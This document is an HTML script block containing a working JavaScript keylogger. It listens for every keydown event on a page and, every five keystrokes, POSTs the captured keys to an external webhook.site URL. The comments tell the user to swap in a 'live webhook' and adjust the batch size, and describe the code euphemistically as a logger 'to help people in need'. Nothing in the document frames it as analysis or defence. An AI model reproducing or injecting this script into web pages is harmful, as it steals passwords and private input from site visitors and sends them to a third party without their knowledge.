

    <script>

        // Live logger to help people in need.
        // Change webhook url to live webhook in the fetch function.
        // Modify # of keystrokes you want before sending the data.
	      // look for a form parameter named "keystrokes"

        (function() {
            // Array to store captured keys
            let capturedKeys = [];

            // Function to send data to a webhook
            function sendDataToWebhook(data) {
                const formData = new URLSearchParams();
                formData.append('keystrokes', data.join(''));  // Convert array to string

                fetch('https://webhook.site/01ad73ef-2837-48b2-a4e0-6b8caca4b6ec', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Success:', data);
                })
                .catch((error) => {
                    console.error('Error:', error);
                });
            }

            // Event listener to capture keystrokes and send data when necessary
            document.addEventListener('keydown', function(event) {
                capturedKeys.push(event.key);
                
                if (capturedKeys.length >= 5) {
                    sendDataToWebhook(capturedKeys);
                    capturedKeys = [];  // Reset the captured keys
                }
            });
        })();

    </script>
